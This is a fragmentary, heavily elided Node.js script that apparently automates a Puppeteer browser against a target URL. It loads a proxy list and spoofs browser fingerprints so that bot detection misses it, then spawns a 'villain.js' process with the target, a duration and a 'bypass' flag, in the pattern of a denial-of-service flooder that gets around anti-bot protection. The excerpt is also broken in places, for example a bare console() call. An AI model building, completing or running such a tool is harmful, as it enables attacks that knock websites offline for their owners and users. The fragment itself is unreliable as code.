...
const prox2y = fs.readFileSync('bp2.txt').toString().match(/\S+/g);
...
if (target == null && time == null) {
  console('Usage: node browser.js [URL] [TIME] [REQ]');
}
  ...
  puppeteer.launch({
    ...
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'plugins', {
        get: () => [{
          0: {
            type: "__application/x-google-chrome-pdf~pdf~",
            suffixes: "pdf",
...
setTimeout(() => {
  ...
  spawn('node', ["villain.js", target, time,browser_saves, '10','bp2.txt', 'bypass']);
}, expiree - Date.now());
